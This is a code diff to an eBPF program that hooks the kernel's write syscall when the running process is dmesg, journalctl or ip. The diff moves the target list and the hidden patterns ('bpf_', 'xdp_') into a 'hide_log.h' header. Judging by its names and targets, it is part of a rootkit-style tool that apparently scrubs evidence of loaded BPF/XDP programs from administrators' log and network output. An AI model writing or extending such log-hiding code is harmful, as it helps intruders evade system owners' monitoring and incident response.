@@ -1,31 +1,8 @@
 //go:build ignore
 #include "vmlinux.h"
-#include <bpf/bpf_helpers.h>
 #include <bpf/bpf_tracing.h>
 #include <bpf/bpf_core_read.h>
-
-#define MAX_BUF 200
-#define MAX_PATTERNS 2
-#define MAX_PATTERN_LEN 32
-#define PATCH_KEY 0
-
-typedef struct {
-    char pattern[MAX_PATTERN_LEN];
-    uint32_t len;
-} StaticPattern;
-
-// You can add more patterns here
-const StaticPattern patterns[MAX_PATTERNS] = {
-    { "bpf_", sizeof("bpf_") - 1 },
-    { "xdp_", sizeof("xdp_") - 1 }
-};
-
-struct {
-    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
-    __uint(max_entries, 1);
-    __type(key, __u32);
-    __type(value, char[MAX_BUF]);
-} patch_map SEC(".maps");
+#include "hide_log.h"
 
 SEC("kprobe/__x64_sys_write")
 int BPF_KPROBE(trace_write)
@@ -39,9 +16,15 @@ int BPF_KPROBE(trace_write)
     char comm[TASK_COMM_LEN] = {};
     bpf_get_current_comm(&comm, sizeof(comm));
 
-    if (__builtin_strncmp(comm, "dmesg", 5) != 0 &&
-        __builtin_strncmp(comm, "journalctl", 10) != 0 &&
-        __builtin_strncmp(comm, "ip", 2) != 0) {
+    int found_command = 0;
+    for (int c = 0; c < MAX_COMMANDS; c++) {
+        if (__builtin_strncmp(comm, commands[c].command, commands[c].len) == 0) {
+            found_command = 1;
+            break;
+        }
+    }
+    
+    if (!found_command) {
         return 0;
     }
 
